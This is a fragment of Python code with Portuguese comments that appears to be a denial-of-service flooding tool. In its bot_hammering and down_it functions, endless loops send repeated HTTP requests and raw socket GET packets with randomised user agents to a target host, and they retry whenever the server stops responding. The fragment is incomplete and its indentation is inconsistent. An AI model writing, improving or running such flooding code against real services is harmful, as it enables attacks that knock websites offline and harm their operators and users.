...
while True:
        ...
        def bot_hammering(url):
            while True:
              try:
                # Cria uma nova requisição para evitar cache de estados anteriores
               req = urllib.request.urlopen(
                urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}),
                timeout=5  # Timeout para garantir que o servidor responda
            )
               print("\033[94mbot is hammering\033[0m")  # Indica requisição enviada com sucesso
              except urllib.error.URLError:
               print("\033[91mServidor inacessível. Tentando novamente...\033[0m")
               time.sleep(1)  # Aguarda antes de tentar novamente
              except Exception:
               print("\033[91mErro inesperado. Tentando novamente...\033[0m")
               time.sleep(1)  # Aguarda antes de tentar novamente
        time.sleep(0.1)  # Pausa antes de enviar a próxima requisição

        def down_it(item):
            while True:
                try:
                 # Gera um novo pacote e tenta conectar ao servidor
                  packet = str(
                "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  s.settimeout(5)  # Define timeout para evitar travamentos
                  s.connect((host, int(port)))  # Força uma nova conexão
                  s.sendto(packet, (host, int(port)))  # Envia o pacote
                  s.shutdown(socket.SHUT_WR)  # Fecha a conexão corretamente
                  print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--Packet sent successfully--> \033[0m")
                except socket.timeout:
                  print("\033[91mTimeout na conexão. Tentando novamente...\033[0m")
                  time.sleep(1)  # Aguarda antes de tentar novamente
                except socket.error:
                  print("\033[91mErro de conexão. Tentando novamente...\033[0m")
                  time.sleep(1)  # Aguarda antes de tentar novamente
                except Exception:
                  print("\033[91mErro inesperado. Tentando novamente...\033[0m")
                  time.sleep(1)  # Aguarda antes de tentar novamente
        time.sleep(0.1)  # Pausa antes de enviar o próximo pacote
